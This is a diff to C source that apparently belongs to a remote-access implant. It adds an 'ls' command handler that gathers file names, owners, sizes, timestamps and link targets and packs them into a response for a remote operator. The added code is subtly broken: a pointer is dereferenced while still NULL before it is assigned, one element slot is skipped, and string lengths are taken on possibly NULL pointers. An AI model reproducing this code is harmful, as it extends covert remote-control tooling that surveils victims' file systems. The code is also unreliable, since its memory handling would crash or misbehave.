@@ -738,7 +738,57 @@ BOOL LsHandlerCallback
 	_In_ LPVOID lpArgs
 )
 {
+	PFILE_INFO* pFirstFileInfo = (PFILE_INFO*)lpArgs;
+	PFILE_INFO pCurrentFileInfo = NULL;
+	UINT64 uModifiedTime = 0;
 
+	if (pFirstFileInfo[0]->dwIdx >= pFirstFileInfo[0]->dwMaxCount) {
+		return TRUE;
+	}
+
+	wprintf(L"lpPath: %lls\n", lpPath);
+	if (IsFolderExist(lpPath)) {
+		pCurrentFileInfo->IsDir = TRUE;
+	}
+	else {
+		pCurrentFileInfo->uFileSize = GetFileSizeByPath(lpPath);
+	}
+
+	pCurrentFileInfo = pFirstFileInfo[pFirstFileInfo[0]->dwIdx++];
+	pCurrentFileInfo->lpName = GetNameFromPathA(lpPath);
+	pCurrentFileInfo->lpOwner = GetFileOwner(lpPath);
+	uModifiedTime = GetModifiedTime(lpPath);
+	pCurrentFileInfo->uModifiedTime = ConvertFileTimeToUnixTimestamp(uModifiedTime);
+	if (IsStrEndsWithW(lpPath, L".lnk")) {
+		pCurrentFileInfo->lpLinkPath = GetTargetShortcutFile(lpPath);
+	}
+	else {
+		pCurrentFileInfo->lpLinkPath = GetSymbolLinkTargetPath(lpPath);
+	}
+
+	return FALSE;
+}
+
+VOID FreeFileInfo
+(
+	_In_ PFILE_INFO pFileInfo
+)
+{
+	if (pFileInfo != NULL) {
+		if (pFileInfo->lpName != NULL) {
+			FREE(pFileInfo->lpName);
+		}
+
+		if (pFileInfo->lpOwner != NULL) {
+			FREE(pFileInfo->lpOwner);
+		}
+
+		if (pFileInfo->lpLinkPath != NULL) {
+			FREE(pFileInfo->lpLinkPath);
+		}
+
+		FREE(pFileInfo);
+	}
 }
 
 PENVELOPE LsHandler
@@ -747,14 +797,18 @@ PENVELOPE LsHandler
 )
 {
 	PPBElement pRecvElement = NULL;
+	PPBElement FileInfoElement[8];
+	PPBElement FinalElement = NULL;
+	PPBElement* pElementList = NULL;
 	PBUFFER* UnmarshalledData = NULL;
 	LPSTR lpPath = NULL;
 	LPWSTR lpConvertedPath = NULL;
-	LPSTR lpFileName = NULL;
 	LPSTR lpErrorDesc = NULL;
 	PENVELOPE pRespEnvelope = NULL;
-	BOOL IsFile = FALSE;
 	DWORD dwNumberOfItems = 0;
+	PFILE_INFO* FileList = NULL;
+	DWORD i = 0;
+	DWORD j = 0;
 
 	pRecvElement = ALLOC(sizeof(PBElement));
 	pRecvElement->Type = Bytes;
@@ -777,9 +831,37 @@ PENVELOPE LsHandler
 	}
 	else {
 		dwNumberOfItems = GetChildItemCount(lpConvertedPath);
-		//ListFileEx(lpConvertedPath, 0, );
+		FileList = ALLOC(sizeof(PFILE_INFO) * dwNumberOfItems);
+		for (i = 0; i < dwNumberOfItems; i++) {
+			FileList[i] = ALLOC(sizeof(FILE_INFO));
+		}
+
+		FileList[0]->dwMaxCount = dwNumberOfItems;
+		ListFileEx(lpConvertedPath, 0, (LIST_FILE_CALLBACK)LsHandlerCallback, FileList);
+		dwNumberOfItems = FileList[0]->dwIdx;
+		pElementList = ALLOC(sizeof(PPBElement) * dwNumberOfItems);
+		for (i = 0; i < dwNumberOfItems; i++) {
+			SecureZeroMemory(&FileInfoElement, sizeof(FileInfoElement));
+			FileInfoElement[0] = CreateBytesElement(FileList[i]->lpName, lstrlenA(FileList[i]->lpName), 1);
+			FileInfoElement[1] = CreateVarIntElement(FileList[i]->IsDir, 2);
+			FileInfoElement[2] = CreateVarIntElement(FileList[i]->uFileSize, 3);
+			FileInfoElement[3] = CreateVarIntElement(FileList[i]->uModifiedTime, 4);
+			FileInfoElement[5] = CreateBytesElement(FileList[i]->lpLinkPath, lstrlenA(FileList[i]->lpLinkPath), 6);
+			FileInfoElement[6] = CreateBytesElement(FileList[i]->lpOwner, lstrlenA(FileList[i]->lpOwner), 7);
+
+			pElementList[i] = CreateStructElement(FileInfoElement, _countof(FileInfoElement), 0);
+		}
+
+		FinalElement = CreateRepeatedStructElement(pElementList, dwNumberOfItems, 1);
 	}
 
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = FinalElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = FinalElement->cbMarshalledData;
+	FinalElement->pMarshalledData = NULL;
+	FinalElement->cbMarshalledData = 0;
 CLEANUP:
 	if (lpErrorDesc != NULL) {
 		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
@@ -795,7 +877,26 @@ CLEANUP:
 		FREE(lpPath);
 	}
 
+	if (pElementList != NULL) {
+		FREE(pElementList);
+	}
+
+	if (lpConvertedPath != NULL) {
+		FREE(lpConvertedPath);
+	}
+
+	if (FileList != NULL) {
+		for (i = 0; i < dwNumberOfItems; i++) {
+			FreeFileInfo(FileList[i]);
+		}
+
+		FREE(FileList);
+	}
+
 	FreeElement(pRecvElement);
+	FreeElement(FinalElement);
+
+	return pRespEnvelope;
 }
 
 PENVELOPE IcaclsHandler
@@ -2517,7 +2618,7 @@ VOID MainHandler
 	
 	}
 	else if (pEnvelope->uType == MsgLsReq) {
-	
+		pResp = LsHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgDownloadReq) {
 	
